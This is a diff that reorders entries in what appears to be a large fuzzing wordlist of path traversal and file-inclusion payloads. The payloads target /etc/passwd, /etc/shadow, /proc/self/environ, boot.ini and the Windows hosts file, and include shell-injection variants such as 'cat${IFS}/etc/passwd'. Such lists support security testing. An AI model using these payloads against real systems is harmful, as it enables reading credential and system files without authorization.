@@ -16324,8 +16324,8 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ..%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
 ..%25c1%259c{FILE}
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
-..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
 ..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
@@ -17132,7 +17132,6 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ........................................................................../../boot.ini
 ........................................................................../../{FILE}
 ..........................................................................//etc/passwd
-....//....//....//....//etc/passwd
 ........................................................................../boot.ini
 ........................................................................../{FILE}
 ..........................................................................\..\..\..\..\..\..\..\/etc/passwd
@@ -17831,7 +17830,6 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ....//....//....//....//....//....//boot.ini
 ....//....//....//....//....//....//etc//issue
 ....//....//....//....//....//....//etc//passwd
-../../../../../../../../../../../etc//passwd
 ....//....//....//....//....//....//windows//system32//drivers//etc//hosts
 ....//....//....//....//....//boot.ini
 ....//....//....//....//....//etc//issue
@@ -17840,6 +17838,7 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ....//....//....//....//boot.ini
 ....//....//....//....//etc//issue
 ....//....//....//....//etc//passwd
+....//....//....//....//etc/passwd
 ....//....//....//....//windows//system32//drivers//etc//hosts
 ....//....//....//boot.ini
 ....//....//....//etc//issue
@@ -18971,6 +18970,7 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ../../../../../../../../../../../../proc/self/environ%00
 ../../../../../../../../../../../../proc/self/fd/8
 ../../../../../../../../../../../../proc/self/fd/8%00
+../../../../../../../../../../../etc//passwd
 ../../../../../../../../../../../etc/group
 ../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../etc/passwd%00
@@ -19217,7 +19217,6 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ../../../../etc/issue;index.htm
 ../../../../etc/issue;index.html
 ../../../../etc/passwd
-///////../../../etc/passwd
 ../../../../etc/passwd%00
 ../../../../etc/passwd%00index.htm
 ../../../../etc/passwd%00index.html
@@ -23015,6 +23014,7 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 ////%2e%2e%2f%2e%2e%2f{FILE}
 ////%2e%2e%2fboot.ini
 ////%2e%2e%2f{FILE}
+///////../../../etc/passwd
 /0x2e0x2e/
 /0x2e0x2e/0x2e0x2e/
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/
@@ -23111,8 +23111,8 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 /0x2e0x2e\0x2e0x2e\{FILE}
 /0x2e0x2e\boot.ini
 /0x2e0x2e\{FILE}
-/??…
 /???/??t+/???/??ss??
+/??…
 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../
 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../
 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../
@@ -27211,10 +27211,6 @@ c:\php5\php.ini
 c:\php\php.ini
 c:\wamp\logs\access.log
 c:\xampp\apache\bin\php.ini
-cat</etc/passwd
-cat%3C/etc/passwd
-cat%3C%2fetc%2fpasswd
-{cat,/etc/passwd}
 cat$IFS/etc/passwd
 cat${IFS}/etc/passwd
 cat%20/etc/passwd
@@ -27222,6 +27218,9 @@ cat%20/ℯ𝐓Ⓒ/𝐩?sswd
 cat%20/🄴🅃🄲/🅂?🄰🄳??
 cat%20/ℯ𝙏𝘾/𝙋𝘼𝙎𝙎𝙒𝘿
 cat%20/🄴🅃🄲/🄿🄰🅂🅂🅆🄳
+cat%3C%2fetc%2fpasswd
+cat%3C/etc/passwd
+cat</etc/passwd
 config.asp
 config.inc.php
 config.js
@@ -27263,6 +27262,7 @@ users/.htpasswd
 web.config
 wp-admin.php
 wp-login.php
+{cat,/etc/passwd}
 ~/.Xdefaults
 ~/.Xresources
 ~/.atfp_history
